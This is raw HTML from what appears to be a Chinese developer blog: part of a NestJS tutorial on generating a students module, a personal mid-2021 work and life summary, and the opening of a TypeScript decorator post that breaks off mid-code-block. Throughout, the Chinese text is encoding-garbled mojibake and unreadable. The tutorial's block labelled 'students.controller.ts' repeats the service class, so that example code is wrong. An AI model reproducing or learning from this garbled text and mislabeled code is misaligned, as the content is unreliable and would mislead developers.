<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello-world"></a>hello-world</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// step1: è¿›å…¥ç›®å½•</span><br><span class="line">cd nest-test</span><br><span class="line"></span><br><span class="line">// step2: å®‰è£…ä¾èµ–æˆ–æ›´æ–°ä¾èµ–</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">// step3: è¿è¡Œç¨‹åº</span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure>
<p>æœ€åæµè§ˆå™¨è®¿é—®url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®: http://localhost:3000/</span><br><span class="line">// =&gt; Hello World!  âœ…</span><br></pre></td></tr></table></figure></p>
<p>è¯´æ˜ç¨‹åºå·²ç»æˆåŠŸè®¿é—®äº†ï¼</p>
<h1 id="å…­ã€ç”Ÿæˆæ–°æ¨¡å—"><a href="#å…­ã€ç”Ÿæˆæ–°æ¨¡å—" class="headerlink" title="å…­ã€ç”Ÿæˆæ–°æ¨¡å—"></a>å…­ã€ç”Ÿæˆæ–°æ¨¡å—</h1><h2 id="æ‰§è¡Œå‘½ä»¤"><a href="#æ‰§è¡Œå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå‘½ä»¤"></a>æ‰§è¡Œå‘½ä»¤</h2><p>èƒ½è®¿é—®æ–°æ¨¡å—äº†ï¼Œå†è¿›ä¸€æ­¥æœŸæœ›ç”Ÿæˆæ–‡ä»¶å¤¹å’Œæ–‡ä»¶å¤¹çš„æ¨¡å—ã€‚NestJS cli ä¹Ÿæ”¯æŒç”¨å‘½ä»¤è¡Œå½¢å¼æ¥åˆ›å»ºï¼Œè¿™æ ·å°±ä¸éœ€è¦åšé‡å¤çš„åˆ›å»ºæ–‡ä»¶çš„åŠ¨ä½œäº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nest g controller students</span><br><span class="line">nest g service students</span><br><span class="line">nest g module students</span><br></pre></td></tr></table></figure></p>
<h2 id="ç›®å½•ç»“æ„-1"><a href="#ç›®å½•ç»“æ„-1" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><p>å†å‘½ä»¤è¡Œåˆ†åˆ«æ‰§è¡Œä»¥ä¸Šä¸‰æ¡å‘½ä»¤ï¼Œsrc/ ç›®å½•å˜æˆäº†å¦‚ä¸‹æ ·å­<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  |- app.controller.spec.ts</span><br><span class="line">  |- app.controller.ts     </span><br><span class="line">  |- app.module.ts         </span><br><span class="line">  |- app.service.ts        </span><br><span class="line">  |- main.ts               </span><br><span class="line">  |- students/</span><br><span class="line">        |- students.controller.spec.ts</span><br><span class="line">        |- students.controller.ts     </span><br><span class="line">        |- students.module.ts         </span><br><span class="line">        |- students.service.spec.ts</span><br><span class="line">        |- students.service.ts</span><br></pre></td></tr></table></figure></p>
<h2 id="ç¼–è¾‘æ–‡ä»¶"><a href="#ç¼–è¾‘æ–‡ä»¶" class="headerlink" title="ç¼–è¾‘æ–‡ä»¶"></a>ç¼–è¾‘æ–‡ä»¶</h2><p>ç¼–è¾‘å¦‚ä¸‹æ–‡ä»¶:<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    ImStudent() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é‡å¯æœåŠ¡, åŠ ä¸Š dev å°±èƒ½ç›‘å¬æ–‡ä»¶ä¿®æ”¹äº†ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start:dev</span><br></pre></td></tr></table></figure></p>
<p>æœ€åæµè§ˆå™¨è®¿é—®url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/who-are-you</span><br><span class="line">// =&gt; Im student  âœ…</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ ·æ¨¡å—æ·»åŠ å®Œæˆäº†</p>
<p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œè¯´æ˜ä½ çœŸçš„å¯¹ NestJS å¾ˆæ„Ÿå…´è¶£ã€‚<a href="/nestJs/nest-js-tutorial-2/" title="ä¸‹ç« ">ä¸‹ç« </a>å°†ä¼šå¯¹æ¥å£å†æ·±å…¥ç»†åŒ–ã€‚</p>
<p>å®Œæ•´ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> æ‰¾åˆ°</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/éšç¬”/2021-middle-summary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/éšç¬”/2021-middle-summary/" itemprop="url">ç®—æ˜¯ 2021 çš„å¹´ä¸­æ€»ç»“</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-09-10T23:10:30+08:00">
                2021-09-10
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©æ˜¯9æœˆå¹³å¸¸çš„å‘¨äº”ï¼Œå¯æ˜¯å¯¹æˆ‘æ¥è¯´æœ‰ä¸€ç‚¹ç‚¹ä¸ä¸€æ ·ï¼Œæ™šä¸Š10ç‚¹ç»ˆäºæŠŠè´Ÿè´£5ä¸ªæœˆçš„é¡¹ç›®å‘å‡ºå»äº†ã€‚é‚£æ˜¯æˆ‘4æœˆä¸­åˆ°ç°åœ¨åšçš„é¡¹ç›®ï¼Œè™½ç„¶å·²ç»å‘äº†å‡ ç‰ˆï¼Œä½†ä»Šå¤©æ˜¯æˆ‘æœ€åä¸€æ¬¡è´Ÿè´£å‘å¸ƒå®ƒã€‚ä¸‹å‘¨å°±è¦å¼€å§‹è´Ÿè´£æ–°çš„é¡¹ç›®äº†ã€‚</p>
<p>æˆ‘æœ‰äº›ç–²æƒ«çš„åˆ°äº†å®¶é—¨å£ï¼Œä¸‹æ„è¯†æ‹¿å‡ºäº†è£¤å­å£è¢‹çš„é’¥åŒ™ï¼Œç„¶åæ’è¿›äº†é’¥åŒ™å­”ï¼Œç†Ÿç»ƒçš„æ—‹è½¬äº†2åœˆã€‚è¿›é—¨åçœ‹äº†çœ‹æ‰‹è¡¨ï¼Œå·²ç»22:25äº†ï¼Œè¿˜æœ‰5åˆ†é’Ÿå°±è¦ä¸Šå¤–æ•™è¯¾ã€‚ç„¶åæœ‰äº›æ€¥ä¿ƒçš„è·‘åˆ°é˜³å°ï¼Œæ”¶æ‹¾å·²ç»è‰¯å¥½çš„è¡£æœï¼Œå†æŠŠè¡£æœå è¿›è¡£æŸœã€‚</p>
<p>çœ‹äº†çœ‹æ—¶é—´ï¼Œè¿˜æœ‰3åˆ†é’Ÿã€‚æˆ‘ç«‹é©¬å†²è¿›å•æ‰€æ´—äº†æŠŠè„¸ï¼Œå¸Œæœ›æ¸…é†’ä¸€äº›ï¼Œä¹Ÿå¸Œæœ›ç»™å¤–æ•™ç•™ä¸ªå¥½å°è±¡ã€‚</p>
<p>è¯¾ç¨‹å¼€å§‹äº†ï¼Œåˆæ˜¯ç†Ÿæ‚‰çš„è‡ªæˆ‘ä»‹ç»ç¯èŠ‚ï¼Œå†å˜˜å¯’é—®æš–äº†ä¸€ç•ªã€‚ä»èŠå¤©ä¸­å¾—çŸ¥å¤–æ•™æ˜¯å—éäººï¼Œæ¯”æˆ‘ä»¬æ™š6ä¸ªå°æ—¶ï¼Œè€Œä¸”åœ¨å—åŠçƒï¼Œç°åœ¨æ˜¯å†¬å¤©ã€‚æˆ‘è¡¨ç¤ºåƒæƒŠï¼Œå¥¹ä¹Ÿçœ‹äº†çœ‹æ—¶é—´ï¼Œå¤¸æˆ‘æœ‰æ¯…åŠ›ã€‚åœ¨ä¸€é¡¿æ¬¢å£°ç¬‘è¯­ä¸­ç»“æŸäº†ã€‚</p>
<p>æˆ‘æ‹¿ç€æ´—å¥½çš„è¡£æœå’Œæ¯›å·¾ï¼Œè¿›å…¥å•æ‰€çš„é‚£ä¸€åˆ»ï¼Œä¸€å¤©çš„é‡æ‹…ä»¿ä½›æ‰å¸ä¸‹æ¥ï¼Œè¿™æ®µæ—¶é—´çš„é‡æ‹…ä»¿ä½›æ‰å¸ä¸‹æ¥ã€‚</p>
<h2 id="é¡¹ç›®å’‹æ ·"><a href="#é¡¹ç›®å’‹æ ·" class="headerlink" title="é¡¹ç›®å’‹æ ·"></a>é¡¹ç›®å’‹æ ·</h2><p>è¿™ç®—æ˜¯æˆ‘åœ¨å›¢é˜Ÿè´Ÿè´£æœ€ä¹…çš„é¡¹ç›®ä¹‹ä¸€ï¼Œå†æ—¶5ä¸ªåŠæœˆã€‚è¿™ç®—æ˜¯ä¸€æ¬¡å®Œæ•´ç‰ˆçš„ä¸­å°é¡¹ç›®ï¼Œå®Œå…¨ç”± Typescript æ­å»ºã€‚åŒ…æ‹¬ React åšå‰ç«¯ã€Nest js åšåå°ã€Nginx åšè½¬å‘ã€Docker åšå®¹çš„å®Œæ•´ä¸­å°ï¼Œå‡ ä¹æ‰€æœ‰çš„æ¶æ„ä»£ç éƒ½æ˜¯æˆ‘æ­å»ºçš„ã€‚å®ƒåŒ…æ‹¬ æ•°æ®åº“åšå­˜å‚¨ã€log4js åšæ—¥å¿—ã€æƒé™æ§åˆ¶ã€é…ç½®å‘å¸ƒã€å•å…ƒæµ‹è¯•ç­‰ç­‰ï¼Œå‡ ä¹æ˜¯å®Œæ•´çš„åå°äº†ã€‚å®ƒçš„ä½œç”¨æ˜¯è´Ÿè´£è¿è¥é…ç½®ç›¸å…³ï¼ŒåŒ…æ‹¬å‡çº§ã€å¢é‡å‡çº§ã€é…ç½®ä¸‹å‘ã€é‚®ä»¶æ¨¡ç‰ˆç­‰åŠŸèƒ½ã€‚</p>
<p>æ­å»ºçš„å†å¥½ï¼Œä¹Ÿéƒ½äº¤ç»™å…¶ä»–åŒå­¦è´Ÿè´£äº†ã€‚äººæ€»æ˜¯è¦æˆé•¿ï¼Œä½œä¸ºå‰ç«¯å·¥ç¨‹å¸ˆä¹Ÿå¾—åšç‚¹çº¯å‰ç«¯çš„äº‹æƒ…ã€‚ä½†æ˜¯æ€»æœ‰äº›èˆä¸å¾—ã€‚è°å¿å¿ƒæŠŠè‡ªå·±ä¸€æ‰‹æŠšå…»é•¿å¤§çš„ baby ç»™å…¶ä»–äººç…§é¡¾ï¼Ÿæ›´ä½•å†µæ˜¯æˆ‘å¸¦ç€å¥½å‡ ä¸ªåŒå­¦æ‰“é€ å‡ºæ¥çš„â€œæ°ä½œâ€ï¼Ÿï¼ˆè‡³å°‘å¯¹æˆ‘æ¥è¯´æ˜¯æ°ä½œï¼ï¼‰</p>
<p>ä¸ç®¡å’‹æ ·ï¼Œå¥½å¥½ä¼‘æ¯ä¸€ç•ªï¼Œå†åŠ æ²¹æäº‹å§ï¼</p>
<h2 id="ç”Ÿæ´»å‘¢"><a href="#ç”Ÿæ´»å‘¢" class="headerlink" title="ç”Ÿæ´»å‘¢"></a>ç”Ÿæ´»å‘¢</h2><p>ç”Ÿæ´»æ˜¯å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ã€‚å’Œæˆ‘å¥èº«çš„å¥½å‹ç›¸ç»§ç¦»å¼€äº†è…¾è®¯ï¼Œä¸€ä¸ªå½’èœ€ï¼Œä¸€ä¸ªæ‹¥æŠ±ç¾ŠåŸäº†ã€‚è¯´å®è¯ï¼Œä»–ä»¬ç¦»å¼€æ·±åœ³æ—¶ï¼Œæˆ‘çœŸçš„æœ‰äº›åŠ¨æ‘‡äº†ã€‚è¦ä¸è¦ç¦»å¼€æ·±åœ³ï¼Œè¦ä¸è¦ç¦»å¼€å…¬å¸ï¼Œæˆäº†æˆ‘å‰ä¸¤ä¸ªæœˆé—®è‡ªå·±æœ€å¤šçš„é—®é¢˜ã€‚å¥½åœ¨æˆ‘ç•™ä¸‹æ¥äº†ï¼Œç”Ÿæ´»ä¹Ÿç»™æˆ‘äº†äº›æƒŠå–œã€‚</p>
<p><strong>å†æ¬¡ä¸Šé•œï¼ï¼</strong><br>(è´´ä¸¤å¼ å¸…ç…§å˜»å˜». è§†é¢‘å· è…¾è®¯CSIG â€œæˆ‘åœ¨é¹…å‚åšTo Bâ€ ç¬¬5æœŸ)<br><img src="/éšç¬”/2021-middle-summary/me-with-my-girl.jpg" alt="withMyGirl"><br><img src="/éšç¬”/2021-middle-summary/me.jpg" alt="me"></p>
<p>çœ‹åˆ°å¾ˆå¤šäººè¯„è®ºï¼Œå…¶ä¸­æœ‰å¾ˆå¤šå¥½å…„å¼Ÿå¥½æœ‹å‹ä»¬ã€‚å¥½å…„å¼Ÿã€æˆ‘å´‡æ‹œçš„å­¦é•¿ã€æ€»ç›‘ã€é«˜ä¸­è€å¸ˆç­‰ç­‰éƒ½ä¸ºæˆ‘è½¬å‘åŠ æ²¹ï¼Œå†…å¿ƒä¹Ÿååˆ†çš„è‡ªè±ªï¼Œè¢«è®¤å¯çš„æ„Ÿè§‰çœŸå¥½ã€‚</p>
<p>ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä¹Ÿå¼€å§‹å†™ä¸€äº›æ–‡ç« ã€‚è™½ç„¶æ•ˆæœä¸€èˆ¬èˆ¬ï¼Œé˜…è¯»çš„äººä¸å¤šï¼Œä½†æ˜¯æ¯å½“æˆ‘æ¢ç©¶å¤šæ·±å…¥ä¸€æ¬¡ï¼Œæˆ‘æ„Ÿè§‰è‡ªå·±çš„åŸºç¡€çŸ¥è¯†æ›´åŠ ç‰¢å›ºã€‚ä¹Ÿè®©æˆ‘æœ‰æ›´å¤šçš„åŠ¨åŠ›å†™æ–‡ç« äº†ã€‚</p>
<h2 id="è¯´è¯´å…´è¶£å§"><a href="#è¯´è¯´å…´è¶£å§" class="headerlink" title="è¯´è¯´å…´è¶£å§"></a>è¯´è¯´å…´è¶£å§</h2><p>è‡ªæ‹”ç‰™å‰åï¼Œä½“é‡ä» 142 -&gt; 134 -&gt; 140ã€‚ä»ç˜¦äº†ä¸€åœˆåˆå›æ¥ã€‚æˆ‘çš„å…´è¶£ä¹Ÿç»å†äº†ä¸€æ¬¡è¿‡å±±è½¦ã€‚</p>
<p>å¾ˆä¹…æ²¡æœ‰æ‰“ç¾½æ¯›çƒçš„æˆ‘ï¼Œå†æ¬¡æ‹¿èµ·äº†ç¾½æ¯›çƒæ‹ï¼›çŸ¥é“å¥½å‹è¦ç¦»å¼€æ—¶ï¼Œç–¯ç‹‚çº¦å¥èº«ã€‚ç„¶åå°±æ˜¯ä¸€ä¸ªå¤šæœˆæ²¡åŠ¨å¼¹ã€‚å› ä¸ºæ‹”ç‰™åï¼Œå•¥ä¹Ÿä¸æƒ³å¹²ï¼Œå•¥ä¹Ÿä¸èƒ½å¹²ã€‚ä¹‹ååˆç–¯ç‹‚åå™¬ï¼Œç€äº†é­”ä¸€æ ·å¥èº«ã€‚</p>
<p>æœ€è¿‘çš„å…´è¶£çˆ±å¥½æ˜¯çœ‹æºç å’Œçœ‹ä¹¦ã€‚æˆ‘æŠŠnodeéƒ½æ‹‰ä¸‹å‡†å¤‡å¥½å¥½çœ‹çœ‹ï¼Œé¡ºä¾¿ææprï¼›ä¹Ÿè¿·ä¸Šäº†ä¸€æœ¬ä¹¦å«ã€Šæ²‰æ€å½•ã€‹ã€‚</p>
<p>ç¬¬ä¸€æ¬¡å¬è¯´ æ–¯å¤šè‘›å­¦æ´¾ æ˜¯åœ¨å¾—åˆ°ä¸Šï¼Œæ¯å¤©æ—©ä¸Šéƒ½ä¼šå¬ä¸€èŠ‚è¯¾ã€‚å¬å®Œä¹‹åå‘ç°æ­£æ˜¯æˆ‘ä¸€ç›´è¿½æ±‚çš„å¿ƒæ€ä¸å“è´¨ï¼Œä¸€è¾¹çœ‹ä¹¦ä¸€è¾¹ç»ƒä¹ äº†èµ·æ¥ã€‚çœŸåˆ«è¯´ï¼Œæ•ˆæœç‰¹åˆ«å¥½ï¼Œå› ä¸ºåˆšç»ƒè‚¡ç¥¨å°±é•¿èµ·æ¥äº†å“ˆå“ˆå“ˆã€‚å†…å¿ƒçªƒå–œä¹‹å¤–ï¼Œä¹Ÿå‘Šè¯‰è‡ªå·±é‚£å°±æ¥ç€ç»ƒä¹ å§ã€‚</p>
<p>å…´è¶£åŸºæœ¬ä¸Šå°±è¿™äº›äº†</p>
<h2 id="è¯´è¯´æ¥ä¸‹æ¥çš„è§„åˆ’å§"><a href="#è¯´è¯´æ¥ä¸‹æ¥çš„è§„åˆ’å§" class="headerlink" title="è¯´è¯´æ¥ä¸‹æ¥çš„è§„åˆ’å§"></a>è¯´è¯´æ¥ä¸‹æ¥çš„è§„åˆ’å§</h2><p>é¦–å…ˆæ˜¯å‡†å¤‡å¥½å¥½å†™æ–‡ç« ã€‚å¤šæ²‰æ·€æ²‰æ·€è‡ªå·±ï¼Œå­¦ä¹ æ–°æŠ€æœ¯ï¼Œå¸æ”¶å¥½èƒ½åŠ›ã€‚å¸Œæœ›å¹´åº•å‰å†™å®Œ10ç¯‡æ–‡ç« å§</p>
<p>ç„¶åæ˜¯è‹±è¯­ï¼Œ12æœˆä»½é©¬ä¸Šå°±ä¸€å¹´äº†ã€‚ä¹Ÿç»“æŸäº†å¤–æ•™è¯¾ï¼Œå¸Œæœ›å†æ€»ç»“æ€»ç»“</p>
<p>å†æ˜¯å¥èº«ï¼Œæ™šé¥­å‰æŠ½æ—¶é—´å¥èº«å§ï¼Œä¿æŒä¿æŒèº«æï¼Œä¸ç„¶èµ°å½¢äº†å˜»å˜»</p>
<p>æœ€åæ˜¯ç”Ÿæ´»ï¼Œå¸Œæœ›10æœˆä»½å»è¶Ÿä¸œåŒ—ï¼Œå…«å­—çš„ä¸€æ’‡å…ˆä¿ä½å’¯ï¼Œç•¥ç•¥ç•¥ï½</p>
<p>æœ€åä¹Ÿç¥é˜…è¯»åˆ°è¿™é‡Œçš„ä½ ï¼Œå¿ƒæƒ³äº‹æˆï¼Œä¸‡äº‹å¦‚æ„ï¼</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/typescript/best-practice-of-decorator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/typescript/best-practice-of-decorator/" itemprop="url">Decorator è¿™ä¹ˆå¥½ç”¨ï¼Œèµ¶ç´§ç”¨èµ·æ¥ï¼</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-09-05T20:22:01+08:00">
                2021-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä½ æ˜¯ä¸æ˜¯å› å…¥å‚å’Œç»“æœçš„æ—¥å¿—è€Œè‹¦æ¼ï¼Ÿæ˜¯ä¸æ˜¯ä¸ºè¿è¡Œæ—¶çš„æ•°æ®æ£€æŸ¥è€Œéš¾å—ï¼Ÿæ˜¯ä¸æ˜¯ä¸ºé‰´æƒå‡½æ•°è€Œéƒé—·ï¼Ÿä½¿ç”¨ decorator åï¼Œèƒ½è®©ä»£ç æ›´ä¼˜é›…ï¼Œç¼–ç¨‹æ›´å¿«æ·ã€‚</p>
<h3 id="å•¥æ˜¯-Decorator"><a href="#å•¥æ˜¯-Decorator" class="headerlink" title="å•¥æ˜¯ Decorator?"></a>å•¥æ˜¯ Decorator?</h3><p>Decorator æ˜¯ ES6 ä¸­çš„ææ¡ˆä¹‹ä¸€ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸ª wrapperï¼Œå¯ä»¥ä¸ºç±»ã€å±æ€§æˆ–å‡½æ•°æä¾›é¢å¤–åŠŸèƒ½ã€‚ä¸¾ä¸ªğŸŒ°ï¼š<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">key: <span class="built_in">string</span></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"evaluate: "</span>, key);</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"call: "</span>, key);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>(<span class="string">"Class Decorator"</span>)</span><br><span class="line"><span class="keyword">class</span> A &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"><span class="meta">@f</span>(<span class="string">"Constructor Parameter"</span>) foo</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Method"</span>) <span class="comment">// 1</span></span><br><span class="line">  method(<span class="meta">@f</span>(<span class="string">"Instance Method Parameter"</span>) foo) &#123;&#125; <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@f</span>(<span class="string">"Instance Property"</span>)</span><br><span class="line">  prop?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŸºæœ¬ä¸Šï¼Œè£…é¥°å™¨ä¼šçš„è¡Œä¸ºå°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@f</span>()</span><br><span class="line"><span class="keyword">class</span> A</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">A = f(A) || A</span><br></pre></td></tr></table></figure></p>
<h2 id="ä½¿ç”¨å‰çš„å‡†å¤‡"><a href="#ä½¿ç”¨å‰çš„å‡†å¤‡" class="headerlink" title="ä½¿ç”¨å‰çš„å‡†å¤‡"></a>ä½¿ç”¨å‰çš„å‡†å¤‡</h2><p>è™½ç„¶ Decorator åªæ˜¯ä¸€ä¸ªææ¡ˆï¼Œä½†å¯é€šè¿‡å·¥å…·æ¥ä½¿ç”¨å®ƒï¼š</p>
<h3 id="Babel"><a href="#Babel" class="headerlink" title="Babel:"></a>Babel:</h3><blockquote>
<p>babel-plugin-syntax-decorators<br>babel-plugin-transform-decorators-legacy</p>
</blockquote>
<h3 id="Typescript"><a href="#Typescript" class="headerlink" title="Typescript:"></a>Typescript:</h3><p>å‘½ä»¤è¡Œï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure></p>
<p>tsconfig.json:<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"compilerOptions"</span>: &#123;</span><br><span class="line">    <span class="attr">"target"</span>: <span class="string">"ES5"</span>,</span><br><span class="line">    <span class="attr">"experimentalDecorators"</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="æ‰§è¡Œé¡ºåº"><a href="#æ‰§è¡Œé¡ºåº" class="headerlink" title="æ‰§è¡Œé¡ºåº"></a>æ‰§è¡Œé¡ºåº</h2><p>ä¸åŒç±»å‹çš„è£…é¥°å™¨æ‰§è¡Œé¡ºåºæ˜¯æ˜ç¡®çš„ï¼š<br>1ã€ å®ä¾‹æˆå‘˜ï¼šå‚æ•°è£…é¥°å™¨ -&gt; æ–¹æ³•/è®¿é—®å™¨/å±æ€§ è£…é¥°å™¨<br>2ã€ é™æ€æˆå‘˜ï¼šå‚æ•°è£…é¥°å™¨ -&gt; æ–¹æ³•/è®¿é—®å™¨/å±æ€§ è£…é¥°å™¨<br>3ã€ æ„é€ å‡½æ•°ï¼šå‚æ•°è£…é¥°å™¨<br>4ã€ ç±»è£…é¥°å™¨<br>ä¾‹å¦‚ï¼š</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 